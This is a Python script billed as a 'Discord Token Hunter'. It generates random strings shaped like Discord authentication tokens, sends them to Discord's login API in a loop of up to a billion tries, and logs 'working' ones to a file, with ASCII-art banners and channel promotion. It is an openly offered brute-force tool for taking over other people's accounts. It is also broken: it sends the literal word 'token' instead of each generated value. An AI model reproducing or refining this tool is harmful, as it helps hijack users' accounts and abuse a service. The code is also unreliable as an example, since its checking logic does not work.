#coded by KaanKny_x
#dont steal code 
#subscribe my channel :P
#youtube : KaanKny_x
import random
import time
import base64
import requests
import time
from time import sleep
from os import system, name
def clear():
  if name == 'nt':
    _ = system('cls')
  else:
    _ = system('clear')

total=0
work=0
nowork=0
print("   .    _  .     _____________")
print("   |\_|/__/|    / Welcome The \ ")
print("  / / \/ \  \  /    Discord    \ ")
print(" /__|O||O|__ \ \ Token Hunter  /")
print("|/_ \_/\_/ _\ | \  ___________/")
print("| | (____) | ||  |/")
print("\/\___/\__/  // _/")
print("(_/         ||")
print(" |          ||")
print("  \        //_/ ")
print("   \______//")
print("  __|| __||")
print(" (____(____)")
sleep(5)
clear()
print("   .    _  .     _____________")
print("   |\_|/__/|    /             \ ")
print("  / / \/ \  \  /    Made By    \ ")
print(" /__|O||O|__ \ \   KaanKny_x   /")
print("|/_ \_/\_/ _\ | \  ___________/")
print("| | (____) | ||  |/")
print("\/\___/\__/  // _/")
print("(_/         ||")
print(" |          ||")
print("  \        //_/ ")
print("   \______//")
print("  __|| __||")
print(" (____(____)")
sleep(5)
clear()
print("   .    _  .     _____________")
print("   |\_|/__/|    /             \ ")
print("  / / \/ \  \  /   Subscribe   \ ")
print(" /__|O||O|__ \ \  Him Channel  /")
print("|/_ \_/\_/ _\ | \  ___________/")
print("| | (____) | ||  |/")
print("\/\___/\__/  // _/")
print("(_/         ||")
print(" |          ||")
print("  \        //_/ ")
print("   \______//")
print("  __|| __||")
print(" (____(____)")
sleep(5)
clear()
print("   .    _  .     _____________")
print("   |\_|/__/|    /             \ ")
print("  / / \/ \  \  /    Pls Wait   \ ")
print(" /__|O||O|__ \ \      ...      /")
print("|/_ \_/\_/ _\ | \  ___________/")
print("| | (____) | ||  |/")
print("\/\___/\__/  // _/")
print("(_/         ||")
print(" |          ||")
print("  \        //_/ ")
print("   \______//")
print("  __|| __||")
print(" (____(____)")
sleep(3)
clear()
print("   .    _  .     _____________")
print("   |\_|/__/|    /             \ ")
print("  / / \/ \  \  /   Program Is  \ ")
print(" /__|O||O|__ \ \   Starting..  /")
print("|/_ \_/\_/ _\ | \  ___________/")
print("| | (____) | ||  |/")
print("\/\___/\__/  // _/")
print("(_/         ||")
print(" |          ||")
print("  \        //_/ ")
print("   \______//")
print("  __|| __||")
print(" (____(____)")
sleep(5)
clear()
with open("tokens.txt", "a") as tokens:
  def genPart(l):
    userId=""
    for i in range(0, l):
      userId += str(random.randint(0, 9))
    return base64.b64encode(userId.encode()).decode().replace("=", "")

  def getToken():
    return f"{genPart(random.randint(17, 18))}.{genPart(4)}.{genPart(20)}"

  for i in range(0, 1000000000):
    token = getToken()
    headers={
    'Authorization': 'token' 
}
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    try:
        if src.status_code == 200:
            total+=1
            work+=1
            clear()
            tokens.write(token + "\n")
            print("   .    _  .     _____________________")
            print("   |\_|/__/|    /                     \ ")
            print("  / / \/ \  \  /  Total Check: {} \ ".format(total))
            print(" /__|O||O|__ \ \    Working: {}        /".format(work))
            print("|/_ \_/\_/ _\ | \  ___________________/")
            print("| | (____) | ||  |/")
            print("\/\___/\__/  // _/")
            print("(_/         ||")
            print(" |          ||")
            print("  \        //_/ ")
            print("   \______//")
            print("  __|| __||")
            print(" (____(____)")
        else:
          total+=1
          nowork+=1
          if total ==1 :
            print("Youtube : KaanKny_x")
          elif total % 50 == 0:
            clear()
            print("   .    _  .     _____________________")
            print("   |\_|/__/|    /                     \ ")
            print("  / / \/ \  \  /  Total Check: {} \ ".format(total))
            print(" /__|O||O|__ \ \    Working: {}        /".format(work))
            print("|/_ \_/\_/ _\ | \  ___________________/")
            print("| | (____) | ||  |/")
            print("\/\___/\__/  // _/")
            print("(_/         ||")
            print(" |          ||")
            print("  \        //_/ ")
            print("   \______//")
            print("  __|| __||")
            print(" (____(____)")
    except Exception:
        print("Yeah we can't contact discordapp.com")  
        
